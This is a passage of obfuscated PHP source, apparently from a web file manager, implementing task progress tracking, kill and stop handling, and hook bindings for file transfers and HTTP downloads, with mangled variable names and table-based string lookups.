$this->task[$û¢šÊËî[493]] = $éª±Õ¥±; } self::log($û¢šÊËî[1692] . $this->task[$û¢šÊËî[442]] . $û¢šÊËî[1693] . sprintf($û¢šÊËî[876], timeFloat() - $this->task[$û¢šÊËî[1682]]) . $û¢šÊËî[1694]); Hook::unbind($û¢šÊËî[1638], array($this, $û¢šÊËî[1688])); Hook::unbind($û¢šÊËî[1689], array($this, $û¢šÊËî[1690])); $this->endAfter(); $ì‘„¶©¶ = $this->task; $this->task = !1; Hook::trigger($û¢šÊËî[1695], $ì‘„¶©¶); } public function update($ÅÂµØ•Á = 0, $£Òæ»©Ø = false) { $œ–¹ñøº =& $_SERVER[™»È’øè]; $â®˜Ä¼á =& $this->task; if (!$â®˜Ä¼á) { return; } $â®˜Ä¼á[$œ–¹ñøº[1679]] += $ÅÂµØ•Á; $â®˜Ä¼á[$œ–¹ñøº[1683]] = timeFloat(); if ($â®˜Ä¼á[$œ–¹ñøº[811]]) { if ($â®˜Ä¼á[$œ–¹ñøº[811]] < $â®˜Ä¼á[$œ–¹ñøº[1679]]) { $â®˜Ä¼á[$œ–¹ñøº[811]] = $â®˜Ä¼á[$œ–¹ñøº[1679]]; } $Ì‹¨ê”™ = timeFloat() - $â®˜Ä¼á[$œ–¹ñøº[1682]] - $â®˜Ä¼á[$œ–¹ñøº[1685]]; if ($Ì‹¨ê”™ <= 0) { $Ì‹¨ê”™ = 0.001; } $â®˜Ä¼á[$œ–¹ñøº[1680]] = $â®˜Ä¼á[$œ–¹ñøº[1679]] / $â®˜Ä¼á[$œ–¹ñøº[811]]; $â®˜Ä¼á[$œ–¹ñøº[1681]] = $â®˜Ä¼á[$œ–¹ñøº[1679]] / $Ì‹¨ê”™; if ($â®˜Ä¼á[$œ–¹ñøº[1680]] > 0) { $â®˜Ä¼á[$œ–¹ñøº[1686]] = $Ì‹¨ê”™ * (1 - $â®˜Ä¼á[$œ–¹ñøº[1680]]) / $â®˜Ä¼á[$œ–¹ñøº[1680]]; } $â®˜Ä¼á[$œ–¹ñøº[1686]] = $â®˜Ä¼á[$œ–¹ñøº[1686]] <= 0 ? 0 : $â®˜Ä¼á[$œ–¹ñøº[1686]]; } $this->updateAfter(); $õ÷êÄÓ× = 0.2; if (timeFloat() - $â®˜Ä¼á[$œ–¹ñøº[1684]] < $õ÷êÄÓ× && !$£Òæ»©Ø) { return; } $Ó®İ°é• = self::get($â®˜Ä¼á[$œ–¹ñøº[442]]); $¿àï”Ù´ = $Ó®İ°é•[$œ–¹ñøº[775]]; if ($¿àï”Ù´ == self::STATYS_KILL) { $®÷È¿ä = array($œ–¹ñøº[1696] => LNG($œ–¹ñøº[1697]), $œ–¹ñøº[1242] => !1); Cache::set($œ–¹ñøº[1698] . $this->task[$œ–¹ñøº[442]], $®÷È¿ä, 30); $this->onKill(); $this->end(); die; } else { if ($¿àï”Ù´ == self::STATYS_STOP) { $İ—à’œŠ = 2; $Ó®İ°é•[$œ–¹ñøº[1685]] += $İ—à’œŠ; self::valueSet($â®˜Ä¼á[$œ–¹ñøº[442]], $Ó®İ°é•); sleep($İ—à’œŠ); $this->update(); return; } } $â®˜Ä¼á[$œ–¹ñøº[775]] = $¿àï”Ù´ ? $¿àï”Ù´ : $â®˜Ä¼á[$œ–¹ñøº[775]]; $â®˜Ä¼á[$œ–¹ñøº[1685]] = $Ó®İ°é•[$œ–¹ñøº[1685]] ? $Ó®İ°é•[$œ–¹ñøº[1685]] : 0; $â®˜Ä¼á[$œ–¹ñøº[1684]] = timeFloat(); Hook::trigger($œ–¹ñøº[1699], $â®˜Ä¼á); self::valueSet($â®˜Ä¼á[$œ–¹ñøº[442]], $â®˜Ä¼á); } public function onKillSet($Ô¥¯‰œí, $Ï»ïŸ™Î = array()) { $this->onKillCall = array($Ô¥¯‰œí, $Ï»ïŸ™Î); } public function onKill() { $İÀş‚©À =& $_SERVER[™»È’øè]; self::log($İÀş‚©À[1692] . $this->task[$İÀş‚©À[442]] . $İÀş‚©À[1700]); Hook::trigger($İÀş‚©À[1701], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ìû¹°ğÁ) { $œÍÒÃˆ– =& $_SERVER[™»È’øè]; Cache::set($œÍÒÃˆ–[1698] . $this->task[$œÍÒÃˆ–[442]], $Ìû¹°ğÁ, 60); return $Ìû¹°ğÁ; } public static function get($•ÉªËô‰) { $–œ¸·Äé =& $_SERVER[™»È’øè]; $ğÑİã’• = self::valueGet($•ÉªËô‰); if (is_array($ğÑİã’•) && $ğÑİã’•[$–œ¸·Äé[1702]]) { $Ç×‘‚Ñæ = ActionApply($ğÑİã’•[$–œ¸·Äé[1702]], array($ğÑİã’•)); $ğÑİã’• = is_array($Ç×‘‚Ñæ) ? $Ç×‘‚Ñæ : $ğÑİã’•; } return $ğÑİã’•; } public static function listData() { $Ü‚Î±á£ = self::valueGet(); return array_sort_by($Ü‚Î±á£, $_SERVER[™»È’øè][1682], !0); } public static function kill($ü®àî…) { return self::changeStatus($ü®àî…, self::STATYS_KILL); } public static function stop($¨øÜ‘À ) { return self::changeStatus($¨øÜ‘À , self::STATYS_STOP); } public static function restart($²åªÌ©ˆ) { return self::changeStatus($²åªÌ©ˆ, self::STATYS_RUNNING); } public static function killAll() { $éøèÌÇ =& $_SERVER[™»È’øè]; $ÒÈÏôí = self::listData(); foreach ($ÒÈÏôí as $Şòµ¤€ò) { self::kill($Şòµ¤€ò[$éøèÌÇ[442]]); } sleep(2); foreach ($ÒÈÏôí as $Şòµ¤€ò) { self::valueSet($Şòµ¤€ò[$éøèÌÇ[442]], !1); } } private static function changeStatus($ÏÁˆ¿òï, $Ìİ§¾ ) { $Òú‰ŠÄ =& $_SERVER[™»È’øè]; $¿©ƒñéº = self::valueGet($ÏÁˆ¿òï); if (!$¿©ƒñéº) { return !1; } $¿©ƒñéº[$Òú‰ŠÄ[775]] = $Ìİ§¾ ; self::valueSet($ÏÁˆ¿òï, $¿©ƒñéº); self::log($Òú‰ŠÄ[1703] . $¿©ƒñéº[$Òú‰ŠÄ[442]] . $Òú‰ŠÄ[1704] . $Ìİ§¾ ); return !0; } public static function valueGet($­ãúæ‡Â = false) { $ˆ¤“§¶ =& $_SERVER[™»È’øè]; if ($­ãúæ‡Â) { $Ûæó‘ = Model($ˆ¤“§¶[487])->where(array($ˆ¤“§¶[94] => $­ãúæ‡Â, $ˆ¤“§¶[33] => $ˆ¤“§¶[1101]))->find(); return $Ûæó‘ ? json_decode($Ûæó‘[$ˆ¤“§¶[417]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($öÒÅâƒå = false) { $­ó•§œŒ =& $_SERVER[™»È’øè]; $ë¹É‡Ô¯ = array($­ó•§œŒ[33] => $­ó•§œŒ[1101]); if ($öÒÅâƒå) { $ë¹É‡Ô¯[$­ó•§œŒ[1678]] = $öÒÅâƒå; } $İÈ»Ä¡£ = Model($­ó•§œŒ[487])->where($ë¹É‡Ô¯)->select(); $İÈ»Ä¡£ = $İÈ»Ä¡£ ? $İÈ»Ä¡£ : array(); foreach ($İÈ»Ä¡£ as $ò£Öí´ => $êÂîŸÙ) { $İÈ»Ä¡£[$ò£Öí´] = json_decode($êÂîŸÙ[$­ó•§œŒ[417]], !0); } return $İÈ»Ä¡£; } public static function valueSet($§Ó‘û½Ó, $•ÂËî€î) { $•‘¶™ë =& $_SERVER[™»È’øè]; if (!$•ÂËî€î) { return Model($•‘¶™ë[487])->where(array($•‘¶™ë[94] => $§Ó‘û½Ó, $•‘¶™ë[33] => $•‘¶™ë[1101]))->delete(); } $º˜úµ× = json_encode($•ÂËî€î); if (!$º˜úµ×) { ob_start(); var_dump($•ÂËî€î); $¦æÚçÆõ = ob_get_clean(); self::log($•‘¶™ë[1705] . json_encode_force($¦æÚçÆõ)); } if (!$§Ó‘û½Ó || !$•ÂËî€î[$•‘¶™ë[442]]) { return !1; } $¸Ÿ„‰² = array($•‘¶™ë[33] => $•‘¶™ë[1101], $•‘¶™ë[1678] => USER_ID, $•‘¶™ë[94] => $§Ó‘û½Ó, $•‘¶™ë[417] => $º˜úµ×); $ÔòÕÑ¨ = $•‘¶™ë[1706]; CacheLock::lock($ÔòÕÑ¨); Model($•‘¶™ë[487])->add($¸Ÿ„‰², array(), !0); CacheLock::unlock($ÔòÕÑ¨); } public static function log($¤ÓÂÃ¡À) { if (!GLOBAL_DEBUG) { return; } write_log($¤ÓÂÃ¡À, $_SERVER[™»È’øè][1707]); } } class TaskFileTransfer extends Task { protected function startAfter() { $À°½Ö—Î =& $_SERVER[™»È’øè]; $è½ÁòÏŒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($À°½Ö—Î[1708], array($this, $À°½Ö—Î[1709])); Hook::bind($À°½Ö—Î[1253], array($this, $À°½Ö—Î[1710])); Hook::bind($À°½Ö—Î[1711], array($this, $À°½Ö—Î[1712])); Hook::bind($À°½Ö—Î[635], array($this, $À°½Ö—Î[1713])); Hook::bind($À°½Ö—Î[636], array($this, $À°½Ö—Î[1714])); Hook::bind($À°½Ö—Î[643], array($this, $À°½Ö—Î[1715])); Hook::bind($À°½Ö—Î[644], array($this, $À°½Ö—Î[1716])); Hook::bind($À°½Ö—Î[638], array($this, $À°½Ö—Î[1717])); Hook::bind($À°½Ö—Î[641], array($this, $À°½Ö—Î[1718])); Hook::bind($À°½Ö—Î[604], array($this, $À°½Ö—Î[1719])); Hook::bind($À°½Ö—Î[601], array($this, $À°½Ö—Î[1719])); Hook::bind($À°½Ö—Î[606], array($this, $À°½Ö—Î[1719])); Hook::bind($À°½Ö—Î[608], array($this, $À°½Ö—Î[1719])); Hook::bind($À°½Ö—Î[610], array($this, $À°½Ö—Î[1719])); Hook::bind($À°½Ö—Î[1720], array($this, $À°½Ö—Î[1721])); Hook::bind($À°½Ö—Î[626], array($this, $À°½Ö—Î[1722])); $this->sourceModelCopyFlag = !1; Hook::bind($À°½Ö—Î[1723], array($this, $À°½Ö—Î[1724])); Hook::bind($À°½Ö—Î[1725], array($this, $À°½Ö—Î[1726])); Hook::bind($À°½Ö—Î[1727], array($this, $À°½Ö—Î[1728])); $è½ÁòÏŒ[$À°½Ö—Î[1729]] = LNG($À°½Ö—Î[1730]); $è½ÁòÏŒ[$À°½Ö—Î[1731]] = 0; $è½ÁòÏŒ[$À°½Ö—Î[1732]] = 0; $è½ÁòÏŒ[$À°½Ö—Î[1094]] = $À°½Ö—Î[12]; $è½ÁòÏŒ[$À°½Ö—Î[1733]] = $À°½Ö—Î[12]; $è½ÁòÏŒ[$À°½Ö—Î[1734]] = 0; $è½ÁòÏŒ[$À°½Ö—Î[1735]] = 0; $è½ÁòÏŒ[$À°½Ö—Î[1736]] = 0; if (!$è½ÁòÏŒ[$À°½Ö—Î[1573]]) { $è½ÁòÏŒ[$À°½Ö—Î[1573]] = LNG($À°½Ö—Î[1737]); } } protected function endAfter() { $“¶¦ËÏª =& $_SERVER[™»È’øè]; Hook::unbind($“¶¦ËÏª[1708], array($this, $“¶¦ËÏª[1709])); Hook::unbind($“¶¦ËÏª[1253], array($this, $“¶¦ËÏª[1710])); Hook::unbind($“¶¦ËÏª[1711], array($this, $“¶¦ËÏª[1712])); Hook::unbind($“¶¦ËÏª[635], array($this, $“¶¦ËÏª[1713])); Hook::unbind($“¶¦ËÏª[636], array($this, $“¶¦ËÏª[1714])); Hook::unbind($“¶¦ËÏª[643], array($this, $“¶¦ËÏª[1715])); Hook::unbind($“¶¦ËÏª[644], array($this, $“¶¦ËÏª[1716])); Hook::unbind($“¶¦ËÏª[638], array($this, $“¶¦ËÏª[1717])); Hook::unbind($“¶¦ËÏª[641], array($this, $“¶¦ËÏª[1718])); Hook::unbind($“¶¦ËÏª[604], array($this, $“¶¦ËÏª[1719])); Hook::unbind($“¶¦ËÏª[601], array($this, $“¶¦ËÏª[1719])); Hook::unbind($“¶¦ËÏª[606], array($this, $“¶¦ËÏª[1719])); Hook::unbind($“¶¦ËÏª[608], array($this, $“¶¦ËÏª[1719])); Hook::unbind($“¶¦ËÏª[610], array($this, $“¶¦ËÏª[1719])); Hook::unbind($“¶¦ËÏª[1720], array($this, $“¶¦ËÏª[1721])); Hook::unbind($“¶¦ËÏª[626], array($this, $“¶¦ËÏª[1722])); Hook::unbind($“¶¦ËÏª[1723], array($this, $“¶¦ËÏª[1724])); Hook::unbind($“¶¦ËÏª[1725], array($this, $“¶¦ËÏª[1726])); Hook::unbind($“¶¦ËÏª[1727], array($this, $“¶¦ËÏª[1728])); } public function copyMoveStart($ª¯âïÍ, $ü¢“Í×İ, $ãÀ¨·Ñ, $òåïç„) { $€™‹¦‚œ =& $_SERVER[™»È’øè]; self::log($€™‹¦‚œ[1738] . $ü¢“Í×İ . $€™‹¦‚œ[70] . $òåïç„); $àÚ³Æ§É = rtrim(TEMP_FILES, $€™‹¦‚œ[8]); if (substr($ü¢“Í×İ, 0, strlen($àÚ³Æ§É)) == $àÚ³Æ§É) { return; } if (substr($òåïç„, 0, strlen($àÚ³Æ§É)) == $àÚ³Æ§É) { return; } $å‰¿ı²Ä =& $this->task; $å‰¿ı²Ä[$€™‹¦‚œ[1739]] = KodIO::transferType($ª¯âïÍ, $ãÀ¨·Ñ); $this->update(); } public function updateAfter() { $ƒÔ´ş =& $_SERVER[™»È’øè]; $ñÏÈ”® =& $this->task; if (!$ñÏÈ”®[$ƒÔ´ş[788]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ñÏÈ”®[$ƒÔ´ş[1739]] == $ƒÔ´ş[1345]) { return; } self::updateTask($ñÏÈ”®); } private static function updateTask(&$äÙà˜æ) { $ß·¾æÍİ =& $_SERVER[™»È’øè]; if ($äÙà˜æ[$ß·¾æÍİ[1739]] == $ß·¾æÍİ[1224] || $äÙà˜æ[$ß·¾æÍİ[1739]] == $ß·¾æÍİ[107]) { if ($äÙà˜æ[$ß·¾æÍİ[1733]]) { $äÙà˜æ[$ß·¾æÍİ[1736]] = $äÙà˜æ[$ß·¾æÍİ[1735]] + $äÙà˜æ[$ß·¾æÍİ[1732]]; } } else { if ($äÙà˜æ[$ß·¾æÍİ[1739]] == $ß·¾æÍİ[1346]) { if ($äÙà˜æ[$ß·¾æÍİ[1733]] == $ß·¾æÍİ[1224]) { $äÙà˜æ[$ß·¾æÍİ[1736]] = $äÙà˜æ[$ß·¾æÍİ[1735]] + $äÙà˜æ[$ß·¾æÍİ[1732]] * 0.5; } else { if ($äÙà˜æ[$ß·¾æÍİ[1733]] == $ß·¾æÍİ[107]) { $äÙà˜æ[$ß·¾æÍİ[1736]] = $äÙà˜æ[$ß·¾æÍİ[1735]] + $äÙà˜æ[$ß·¾æÍİ[1731]] * 0.5 + $äÙà˜æ[$ß·¾æÍİ[1732]] * 0.5; } } } } $äÙà˜æ[$ß·¾æÍİ[1680]] = $äÙà˜æ[$ß·¾æÍİ[1736]] / $äÙà˜æ[$ß·¾æÍİ[788]]; if ($äÙà˜æ[$ß·¾æÍİ[1680]] > 0) { $ŒşØõ½ñ = timeFloat() - $äÙà˜æ[$ß·¾æÍİ[1682]] - $äÙà˜æ[$ß·¾æÍİ[1685]]; $äÙà˜æ[$ß·¾æÍİ[1686]] = $ŒşØõ½ñ * (1 - $äÙà˜æ[$ß·¾æÍİ[1680]]) / $äÙà˜æ[$ß·¾æÍİ[1680]]; } } public function addPath($ø„¼üÏÅ) { $èæ·û³æ =& $_SERVER[™»È’øè]; if (!$ø„¼üÏÅ) { return; } $çî†Åø =& $this->task; $²íãâ«¥ = IO::infoWithChildren($ø„¼üÏÅ); $İ¥¿òÍ = $çî†Åø[$èæ·û³æ[1740]] ? $çî†Åø[$èæ·û³æ[1740]][$èæ·û³æ[1741]] : 0; $çî†Åø[$èæ·û³æ[1740]] = array($èæ·û³æ[1741] => $İ¥¿òÍ + 1, $èæ·û³æ[461] => $²íãâ«¥[$èæ·û³æ[32]], $èæ·û³æ[84] => $²íãâ«¥[$èæ·û³æ[84]], $èæ·û³æ[550] => $²íãâ«¥[$èæ·û³æ[550]] ? $²íãâ«¥[$èæ·û³æ[550]] : $²íãâ«¥[$èæ·û³æ[84]]); if ($²íãâ«¥[$èæ·û³æ[33]] == $èæ·û³æ[213]) { $çî†Åø[$èæ·û³æ[811]] += 1; } else { $çî†Åø[$èæ·û³æ[811]] += $²íãâ«¥[$èæ·û³æ[79]][$èæ·û³æ[77]]; if ($²íãâ«¥[$èæ·û³æ[180]]) { $çî†Åø[$èæ·û³æ[811]] += $²íãâ«¥[$èæ·û³æ[79]][$èæ·û³æ[78]] + 1; } } $çî†Åø[$èæ·û³æ[788]] += $²íãâ«¥[$èæ·û³æ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($‡«§®ªÏ) { } public function sourceAddHashEnd($õü›ôæï) { } public function sourceAddFileStart($¹ßöœì) { $¹ÜÒ‚ã =& $_SERVER[™»È’øè]; $Ñ™¥®î =& $this->task; $Ñ™¥®î[$¹ÜÒ‚ã[1731]] = $¹ßöœì[$¹ÜÒ‚ã[76]]; $Ñ™¥®î[$¹ÜÒ‚ã[1729]] = $¹ßöœì[$¹ÜÒ‚ã[32]]; $Ñ™¥®î[$¹ÜÒ‚ã[1094]] = $¹ßöœì[$¹ÜÒ‚ã[32]]; $Ñ™¥®î[$¹ÜÒ‚ã[1742]] = $¹ßöœì[$¹ÜÒ‚ã[84]]; $this->update(); } public function sourceAddFileEnd($İó¯°¬÷) { $şü–¤ =& $_SERVER[™»È’øè]; $†ÃÈÃ¦ß =& $this->task; $†ÃÈÃ¦ß[$şü–¤[1736]] += $İó¯°¬÷[$şü–¤[76]]; $†ÃÈÃ¦ß[$şü–¤[1742]] = $İó¯°¬÷[$şü–¤[84]]; $this->update(1); } public function copyFileStart($©°óµò, $©Å×—¿š, $ü·­˜¨Ê, $÷¼´¤à, $‰Ñ›½£Ç, $Íø×µŒ) { $º„¡ìŠ =& $_SERVER[™»È’øè]; $à¤Ûº‡ = $‰Ñ›½£Ç; if ($à¤Ûº‡ == $GLOBALS[$º„¡ìŠ[1743]]) { $à¤Ûº‡ = $GLOBALS[$º„¡ìŠ[1744]]; } $GLOBALS[$º„¡ìŠ[1744]] = $‰Ñ›½£Ç; $GLOBALS[$º„¡ìŠ[1743]] = $Íø×µŒ; $µèÈ¥ÖË =& $this->task; $µèÈ¥ÖË[$º„¡ìŠ[1729]] = $à¤Ûº‡; $µèÈ¥ÖË[$º„¡ìŠ[1731]] = (int) $©°óµò->size($©Å×—¿š); $µèÈ¥ÖË[$º„¡ìŠ[1732]] = 0; $µèÈ¥ÖË[$º„¡ìŠ[1094]] = $º„¡ìŠ[12]; $µèÈ¥ÖË[$º„¡ìŠ[1733]] = $º„¡ìŠ[12]; $µèÈ¥ÖË[$º„¡ìŠ[1734]] = 0; $”ƒí·« = $µèÈ¥ÖË[$º„¡ìŠ[1731]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($µèÈ¥ÖË[$º„¡ìŠ[442]] . $º„¡ìŠ[1745]); if ($”ƒí·« && file_exists(get_path_father($÷¼´¤à))) { Cache::set($µèÈ¥ÖË[$º„¡ìŠ[442]] . $º„¡ìŠ[1745], $÷¼´¤à); $µèÈ¥ÖË[$º„¡ìŠ[1702]] = array($º„¡ìŠ[1746], $º„¡ìŠ[1747]); } $this->update(0, $”ƒí·«); } public static function updateCopyLocalFileSize($ŸŸÚ‘¿£) { $±¶ä¬« =& $_SERVER[™»È’øè]; $øš¡Ê‚ü = Cache::get($ŸŸÚ‘¿£[$±¶ä¬«[442]] . $±¶ä¬«[1745]); if (!$øš¡Ê‚ü || !file_exists($øš¡Ê‚ü)) { return $ŸŸÚ‘¿£; } $ŸŸÚ‘¿£[$±¶ä¬«[1732]] = @filesize($øš¡Ê‚ü); $ŸŸÚ‘¿£[$±¶ä¬«[1736]] += $ŸŸÚ‘¿£[$±¶ä¬«[1732]]; self::updateTask($ŸŸÚ‘¿£); return $ŸŸÚ‘¿£; } public function copyFileEnd($æù¿Ñ˜ò, $¶Ù¶í¶ğ, $ÄÛã–¸å, $±±ÍöŸ, $Ä˜µ°„ã, $Ùù¿é±¤) { $ü¨ª¹ã­ =& $_SERVER[™»È’øè]; $ñ‚¤äçÌ =& $this->task; $ñ‚¤äçÌ[$ü¨ª¹ã­[1732]] = $ñ‚¤äçÌ[$ü¨ª¹ã­[1731]]; $ñ‚¤äçÌ[$ü¨ª¹ã­[1733]] = $ü¨ª¹ã­[12]; unset($ñ‚¤äçÌ[$ü¨ª¹ã­[1702]]); if ($Ä˜µ°„ã == $ñ‚¤äçÌ[$ü¨ª¹ã­[1729]]) { $ñ‚¤äçÌ[$ü¨ª¹ã­[1735]] += $ñ‚¤äçÌ[$ü¨ª¹ã­[1731]]; $ñ‚¤äçÌ[$ü¨ª¹ã­[1736]] = $ñ‚¤äçÌ[$ü¨ª¹ã­[1735]]; $ÉÑĞìñ  = 1; if (isset($ñ‚¤äçÌ[$ü¨ª¹ã­[1742]]) && $ñ‚¤äçÌ[$ü¨ª¹ã­[1742]] == $¶Ù¶í¶ğ) { $ÉÑĞìñ  = 0; } $this->update($ÉÑĞìñ ); } else { $this->update(); $ñ‚¤äçÌ[$ü¨ª¹ã­[1732]] = 0; } Cache::remove($ñ‚¤äçÌ[$ü¨ª¹ã­[442]] . $ü¨ª¹ã­[1745]); self::log($ü¨ª¹ã­[1748] . $¶Ù¶í¶ğ . $ü¨ª¹ã­[70] . $±±ÍöŸ . $ü¨ª¹ã­[245] . $Ä˜µ°„ã . $ü¨ª¹ã­[1749] . $ñ‚¤äçÌ[$ü¨ª¹ã­[1729]]); } public function updateFileEnd($ÎƒáÚ¢Ò, $ëÎŞºŞ) { $‰èĞ‰„« =& $_SERVER[™»È’øè]; $­›Œ“õö =& $this->task; $­›Œ“õö[$‰èĞ‰„«[1729]] = $ÎƒáÚ¢Ò; $­›Œ“õö[$‰èĞ‰„«[1731]] = $ëÎŞºŞ; $­›Œ“õö[$‰èĞ‰„«[1735]] += $ëÎŞºŞ; $­›Œ“õö[$‰èĞ‰„«[1736]] = $­›Œ“õö[$‰èĞ‰„«[1735]]; $this->update(1); self::log($‰èĞ‰„«[1750] . $ÎƒáÚ¢Ò); } public function sourceModelCopy($·ŞÅõÕ²) { $êç°×öö =& $_SERVER[™»È’øè]; $³•š©Ñ = $·ŞÅõÕ²[0]; $ÀœçĞ¯â = $·ŞÅõÕ²[1]; $âœ”¼¥Ÿ =& $this->task; $this->sourceModelCopyFlag = !0; $×ŠãæïŠ = 0; switch ($³•š©Ñ) { case $êç°×öö[602]: $×ŠãæïŠ = 1; break; case $êç°×öö[605]: $âœ”¼¥Ÿ[$êç°×öö[1729]] = $ÀœçĞ¯â[$êç°×öö[32]]; break; case $êç°×öö[607]: $×ŠãæïŠ = intval($·ŞÅõÕ²[$êç°×öö[423]] * 0.4); break; case $êç°×öö[609]: $×ŠãæïŠ = intval($·ŞÅõÕ²[$êç°×öö[423]] * 0.2); break; case $êç°×öö[611]: $×ŠãæïŠ = intval($·ŞÅõÕ²[$êç°×öö[423]] * 0.4); break; } $this->update($×ŠãæïŠ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($›ïîÛÃ°, $¹ÅªÄô÷) { $¦®‡Û©ë =& $_SERVER[™»È’øè]; $this->sourceModelCopyFlag = !0; $Ñí”‹Ÿš = 1; if (isset($›ïîÛÃ°[$¦®‡Û©ë[79]])) { $Ñí”‹Ÿš = $›ïîÛÃ°[$¦®‡Û©ë[79]][$¦®‡Û©ë[77]]; $Ñí”‹Ÿš = $Ñí”‹Ÿš + $›ïîÛÃ°[$¦®‡Û©ë[79]][$¦®‡Û©ë[78]] + 1; } $this->update($Ñí”‹Ÿš); $this->sourceModelCopyFlag = !1; } public function sourceMove($–¨‚İñ) { $this->sourceRemove($–¨‚İñ, !1); } public function curlProgress($•¹Ç‘†ı, $Ù²ñàù¶, $¯Ó¦÷š¯, $Ñºß—Šü, $š›…ï‡×) { $Ú³„ó³ =& $_SERVER[™»È’øè]; $’†Ÿ—Ğ =& $this->task; if ($š›…ï‡× > 0) { $’†Ÿ—Ğ[$Ú³„ó³[1094]] = $Ú³„ó³[1751]; $’†Ÿ—Ğ[$Ú³„ó³[1733]] = $Ú³„ó³[107]; if ($’†Ÿ—Ğ[$Ú³„ó³[1731]]) { $’†Ÿ—Ğ[$Ú³„ó³[1732]] = $š›…ï‡×; } if ($’†Ÿ—Ğ[$Ú³„ó³[1734]]) { $’†Ÿ—Ğ[$Ú³„ó³[1732]] = $š›…ï‡× + $’†Ÿ—Ğ[$Ú³„ó³[1734]]; } } else { if ($¯Ó¦÷š¯ > 0) { if ($’†Ÿ—Ğ[$Ú³„ó³[1731]] == $Ù²ñàù¶) { $’†Ÿ—Ğ[$Ú³„ó³[1732]] = $¯Ó¦÷š¯; $’†Ÿ—Ğ[$Ú³„ó³[1094]] = $Ú³„ó³[1752]; $’†Ÿ—Ğ[$Ú³„ó³[1733]] = $Ú³„ó³[1224]; } } } $this->update(); } public function curlProgressStart($¦ñïÃô) { } public function curlProgressEnd($ìÖáÎü«) { $ß”æÛ×Ó =& $_SERVER[™»È’øè]; $î™ìºÚë =& $this->task; $¦»ïÇ· = curl_getinfo($ìÖáÎü«); $Ù¥ÄİŠĞ = $¦»ïÇ·[$ß”æÛ×Ó[1753]]; if ($Ù¥ÄİŠĞ == -1) { $Ù¥ÄİŠĞ = $¦»ïÇ·[$ß”æÛ×Ó[1754]]; } if ($î™ìºÚë[$ß”æÛ×Ó[1733]] == $ß”æÛ×Ó[107] && $Ù¥ÄİŠĞ) { $î™ìºÚë[$ß”æÛ×Ó[1734]] += $Ù¥ÄİŠĞ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Îë§­– =& $_SERVER[™»È’øè]; $³î˜“ô =& $this->task; $³î˜“ô[$Îë§­–[1755]] = 1; Hook::bind($Îë§­–[1723], array($this, $Îë§­–[1756])); Hook::bind($Îë§­–[1725], array($this, $Îë§­–[1757])); Hook::bind($Îë§­–[1727], array($this, $Îë§­–[1758])); } protected function endAfter() { $–Ğ¾›§ú =& $_SERVER[™»È’øè]; Hook::unbind($–Ğ¾›§ú[1723], array($this, $–Ğ¾›§ú[1756])); Hook::unbind($–Ğ¾›§ú[1725], array($this, $–Ğ¾›§ú[1757])); Hook::unbind($–Ğ¾›§ú[1727], array($this, $–Ğ¾›§ú[1758])); } public function progressStart($ûìœ…Ö) { $¾á–ñ´á =& $_SERVER[™»È’øè]; $†Òï¶ = curl_getinfo($ûìœ…Ö); self::log($¾á–ñ´á[1759] . $†Òï¶[$¾á–ñ´á[350]]); self::valueSet($this->task[$¾á–ñ´á[442]], $this->task); } public function progressEnd($ëÂÅªùì) { $ºãË¡Îˆ =& $_SERVER[™»È’øè]; self::log($ºãË¡Îˆ[1760] . $this->task[$ºãË¡Îˆ[442]]); $this->end(); } public function progress($““Ó‡ÌÜ, $ïÑÇøË, $€òë™•, $ìÀ¬¡£×, $ùõ„ÁØà) { $‡ıæßÜ =& $_SERVER[™»È’øè]; $»˜¯›©ª =& $this->task; if ($ùõ„ÁØà > 0) { $»˜¯›©ª[$‡ıæßÜ[811]] = $»˜¯›©ª[$‡ıæßÜ[811]] == 0 ? $ìÀ¬¡£× : $»˜¯›©ª[$‡ıæßÜ[811]]; $»˜¯›©ª[$‡ıæßÜ[1679]] = $ùõ„ÁØà; } else { if ($€òë™• > 0) { $»˜¯›©ª[$‡ıæßÜ[811]] = $»˜¯›©ª[$‡ıæßÜ[811]] == 0 ? $ïÑÇøË : $»˜¯›©ª[$‡ıæßÜ[811]]; $»˜¯›©ª[$‡ıæßÜ[1679]] = $€òë™•; } } $this->update(); self::log("\x70\162\x6f\x67\x72\145\163\163\x48\164\164\160\x3a\144\x6f\167\x6e\x3a{$€òë™•}\57{$ïÑÇøË}\73\40\x75\x70\154\x6f\x61\x64\72{$ùõ„ÁØà}\x2f{$ìÀ¬¡£×}\x3b"); } } goto dÌ˜©±õ“Ç; BÖÜÏŸ²‚: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $×ÖÊôÃú =& $_SERVER[™»È’øè]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$×ÖÊôÃú[6]] =& $config; $this->values[$×ÖÊôÃú[7]] =& $in; $this->tpl = TEMPLATE . MOD . $×ÖÊôÃú[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÄªŞßıÑ) { if (1 === func_num_args()) { $this->{$ÄªŞßıÑ} = new $ÄªŞßıÑ(); } else { $ô¾çÙä = new ReflectionClass($ÄªŞßıÑ); $ÍÇÕëÅ¾ = func_get_args(); array_shift($ÍÇÕëÅ¾); $this->{$ÄªŞßıÑ} = $ô¾çÙä->newInstanceArgs($ÍÇÕëÅ¾); } return $this->{$ÄªŞßıÑ}; } public function routeBind($òÛç£¯ú, $Ş·è¼äİ, $ÙûÚÛ¸× = 3) { $ƒ“ƒèŸè =& $_SERVER[™»È’øè]; $¡­ºÓñ = $this->in[$ƒ“ƒèŸè[9]]; $òÛç£¯ú = str_replace($ƒ“ƒèŸè[10], $ƒ“ƒèŸè[11], trim(trim($òÛç£¯ú, $ƒ“ƒèŸè[8]), $ƒ“ƒèŸè[12])); if (!$òÛç£¯ú || count($¡­ºÓñ) <= $ÙûÚÛ¸×) { return !1; } $«¤Î§’ä = !0; $€µæÜ²§ = explode($ƒ“ƒèŸè[8], $òÛç£¯ú); for 